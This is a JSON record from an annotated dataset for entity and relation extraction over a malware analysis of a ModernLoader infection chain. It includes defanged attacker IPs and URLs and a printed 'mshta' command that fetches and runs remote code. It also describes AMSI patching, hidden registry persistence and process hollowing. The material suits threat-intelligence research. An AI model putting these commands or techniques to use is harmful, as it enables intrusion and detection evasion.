{"doc_key": "015", "sentences": [["he", "system", "was", "found", "to", "have", "executed", "a", "command", "."], ["The", "IP", "address", "31.41.244.231", "is", "Russian", "and", "hosts", "several", "similarly", "named", "URLs", "."], ["The", "first", "command", "downloads", "an", "HTA", "application", "with", "encrypted", "VB", "script", "code", "."], ["When", "opened", "in", "a", "browser", ",", "the", "HTA", "file", "displays", "content", "."], ["Once", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["The", "autorunnn.exe", "module", "is", "a", "SharpHide", "variant", "that", "creates", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["The", "program", "also", "creates", "a", "scheduled", "task", "named", "``", "OneDrive", "Standalone", "Update", "Task", "''", "that", "runs", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "modified", "SharpHide", "code", "hides", "the", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "that", "will", "be", "executed", "on", "the", "system", "as", "part", "of", "the", "logon", "sequence", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "which", "contains", "three", "embedded", "modules", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "first", "module", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", "that", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", ".", "It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", ".", "It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injected", "payload", "is", "Client.exe", ",", "a", "ModernLoader", "instance", "."], ["The", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["After", "initializing", ",", "ModernLoader", "collects", "system", "information", ",", "such", "as", "Win32_ComputerSystemProduct", "UUID", ",", "external", "IP", "address", ",", "IP", "address", "country", ",", "and", "user", "privileges", "."], ["ModernLoader", "periodically", "contacts", "the", "C2", "server", "for", "new", "tasks", "until", "the", "process", "is", "terminated", "."], ["Its", "main", "purpose", "is", "to", "download", "and", "execute", "additional", "payloads", "and", "modules", ",", "as", "instructed", "by", "the", "C2", "server", "."]], "ner": [[], [[13, 13, "SO"]], [[24, 25, "MP"], [28, 29, "MF"]], [[40, 40, "TP"], [43, 43, "MP"]], [[52, 52, "MP"], [56, 57, "MF"], [63, 64, "MP"], [66, 70, "SO"], [79, 80, "MP"]], [[83, 83, "MP"], [96, 96, "SF"]], [[112, 112, "MP"], [135, 136, "MF"], [140, 144, "SO"]], [], [[160, 160, "TP"]], [[181, 182, "MP"], [197, 198, "MP"]], [[214, 214, "MP"], [221, 221, "MP"], [233, 233, "TP"]], [[235, 235, "MP"]], [[259, 259, "MP"], [272, 272, "SF"]], [[294, 294, "MF"], [297, 297, "MP"], [301, 301, "MP"], [312, 312, "TP"]], [[324, 324, "MP"], [329, 329, "MP"]], [[353, 353, "MP"], [356, 356, "MP"]], [[367, 368, "SO"]], [[373, 373, "MP"], [376, 376, "TF"]], [[395, 395, "MP"], [399, 400, "SO"]], [[419, 419, "MF"], [427, 428, "SO"]]], "relations": [[], [], [[24, 25, 13, 13, "ST"], [24, 25, 13, 13, "RF"], [24, 25, 28, 29, "WR"], [24, 25, 40, 40, "FR"]], [[40, 40, 43, 43, "FR"], [43, 43, 52, 52, "CO"]], [[52, 52, 56, 57, "EX"], [52, 52, 63, 64, "FR"], [52, 52, 66, 70, "RF"], [52, 52, 79, 80, "FR"], [79, 80, 96, 96, "RD"], [79, 80, 83, 83, "CO"], [79, 80, 112, 112, "CO"]], [[83, 83, 96, 96, "WR"]], [[112, 112, 135, 136, "WR"], [112, 112, 140, 144, "RF"], [112, 112, 160, 160, "FR"]], [], [[160, 160, 135, 136, "EX"], [160, 160, 197, 198, "FR"], [160, 160, 181, 182, "CO"]], [[181, 182, 214, 214, "FR"], [197, 198, 233, 233, "FR"], [181, 182, 235, 235, "FR"]], [[221, 221, 214, 214, "CO"], [214, 214, 297, 297, "CO"]], [[235, 235, 272, 272, "RD"], [235, 235, 259, 259, "CO"]], [[259, 259, 272, 272, "WR"]], [[297, 297, 301, 301, "FR"], [301, 301, 294, 294, "EX"], [301, 301, 312, 312, "IJ"], [312, 312, 324, 324, "FR"], [301, 301, 329, 329, "CO"]], [[329, 329, 353, 353, "FR"], [324, 324, 367, 368, "ST"], [324, 324, 367, 368, "RF"]], [[353, 353, 367, 368, "ST"], [353, 353, 367, 368, "RF"], [353, 353, 356, 356, "CO"], [353, 353, 373, 373, "CO"], [353, 353, 395, 395, "CO"]], [], [[373, 373, 376, 376, "WR"]], [[395, 395, 399, 400, "ST"], [395, 395, 419, 419, "WR"]], []]}